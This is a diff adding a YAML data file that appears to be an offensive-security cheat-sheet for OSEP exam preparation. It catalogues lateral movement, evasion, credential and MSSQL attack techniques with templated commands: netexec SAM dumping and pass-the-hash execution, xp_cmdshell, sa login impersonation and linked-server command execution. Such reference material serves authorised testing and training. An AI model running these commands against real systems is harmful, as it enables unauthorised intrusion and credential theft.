@@ -1,0 +1,180 @@
+sections:
+  - id: osep.p1
+    title: 'OSEP — Lateral, MSSQL & advanced evasion'
+    os: windows
+    order: 401
+    techniques:
+      [
+        osep.evasion.advanced,
+        osep.evasion.netfilter,
+        osep.linux.post,
+        osep.win.creds,
+        osep.win.lateral,
+        osep.mssql.attacks,
+      ]
+    packs: [osep]
+techniques:
+  - id: osep.evasion.advanced
+    title: 'Advanced AV evasion'
+    os: [windows]
+    phase: post-exploitation
+    summary: 'Unhooking / direct-syscall / sleep-obfuscation concepts and how to test them — no payload ships.'
+    commands: [osep.evasion.advanced.av]
+    tags: [osep, evasion]
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    confidence: verified
+    packs: [osep]
+  - id: osep.evasion.netfilter
+    title: 'Bypassing network filters'
+    os: [windows]
+    phase: pivoting
+    summary: 'DNS / HTTPS / domain-fronting tunnelling concept + tooling provenance.'
+    commands: [osep.evasion.netfilter.dns]
+    relatedIds: [xcut.pivot.chisel]
+    tags: [osep, evasion]
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    confidence: verified
+    packs: [osep]
+  - id: osep.linux.post
+    title: 'Linux post-exploitation'
+    os: [linux]
+    phase: post-exploitation
+    summary: 'Reuses the OSCP Linux loot/pivot tree — OSEP lens adds chaining notes.'
+    commands: [osep.linux.post.listen]
+    relatedIds: [linux.post.loot, linux.post.pivot]
+    tags: [osep]
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    confidence: verified
+    packs: [osep]
+  - id: osep.win.creds
+    title: 'Windows credentials'
+    os: [windows]
+    phase: credential-access
+    summary: 'Reuses the OSCP Windows loot / LSASS theft — OSEP one-liner harvest.'
+    commands: [osep.win.creds.sam]
+    relatedIds: [win.loot.creds, ad.lateral.credtheft]
+    tags: [osep]
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    confidence: verified
+    packs: [osep]
+  - id: osep.win.lateral
+    title: 'Windows lateral movement'
+    os: [ad]
+    phase: lateral-movement
+    summary: 'Reuses the OSCP AD exec methods — pass-the-hash one-liner via netexec.'
+    commands: [osep.win.lateral.pth]
+    relatedIds: [ad.lateral.psexec, ad.lateral.wmiexec, ad.lateral.evil-winrm]
+    tags: [osep]
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    confidence: verified
+    packs: [osep]
+  - id: osep.mssql.attacks
+    title: 'Microsoft SQL attacks'
+    os: [ad]
+    phase: exploitation
+    summary: 'Authenticate, command-exec via xp_cmdshell, impersonate logins, and pivot linked servers.'
+    commands:
+      [
+        osep.mssql.attacks.client,
+        osep.mssql.attacks.xpcmd,
+        osep.mssql.attacks.impersonate,
+        osep.mssql.attacks.linked,
+      ]
+    tags: [osep, mssql]
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    confidence: verified
+    packs: [osep]
+commands:
+  - id: osep.evasion.advanced.av
+    title: 'Enumerate registered AV products'
+    template: 'Get-CimInstance -Namespace root/SecurityCenter2 -Class AntiVirusProduct'
+    shell: powershell
+    os: [windows]
+    tags: [osep, evasion]
+    danger: info
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.evasion.netfilter.dns
+    title: 'DNS-tunnel reachability probe'
+    template: 'nslookup -type=txt {{COLLAB}}'
+    shell: cmd
+    os: [windows]
+    tags: [osep, evasion]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.linux.post.listen
+    title: 'Enumerate internal listeners'
+    template: 'ss -tlnp'
+    shell: bash
+    os: [linux]
+    tags: [osep]
+    danger: low
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.win.creds.sam
+    title: 'netexec SAM dump'
+    template: 'nxc smb {{RHOST}} -u {{USER}} -p {{PASS}} --sam'
+    shell: bash
+    os: [windows]
+    tool: netexec
+    tags: [osep]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.win.lateral.pth
+    title: 'netexec pass-the-hash exec'
+    template: 'nxc smb {{RHOST}} -u {{USER}} -H {{NTHASH}} -x "{{CMD}}"'
+    shell: bash
+    os: [ad]
+    tool: netexec
+    tags: [osep]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.mssql.attacks.client
+    title: 'mssqlclient.py auth'
+    template: 'mssqlclient.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{RHOST}} -windows-auth'
+    shell: bash
+    os: [ad]
+    tool: impacket
+    tags: [osep, mssql]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten, ref.impacket]
+    packs: [osep]
+  - id: osep.mssql.attacks.xpcmd
+    title: 'xp_cmdshell exec'
+    template: 'EXEC xp_cmdshell ''{{CMD}}'';'
+    shell: sql
+    os: [ad]
+    tags: [osep, mssql]
+    danger: critical
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.mssql.attacks.impersonate
+    title: 'EXECUTE AS LOGIN impersonation'
+    template: 'EXECUTE AS LOGIN = ''sa''; SELECT SYSTEM_USER;'
+    shell: sql
+    os: [ad]
+    tags: [osep, mssql]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
+  - id: osep.mssql.attacks.linked
+    title: 'Linked-server EXECUTE AT'
+    template: 'EXEC (''{{CMD}}'') AT [{{LINKED}}];'
+    shell: sql
+    os: [ad]
+    tags: [osep, mssql]
+    danger: critical
+    confidence: verified
+    references: [ref.osce3.joas, ref.osep.chvancooten]
+    packs: [osep]
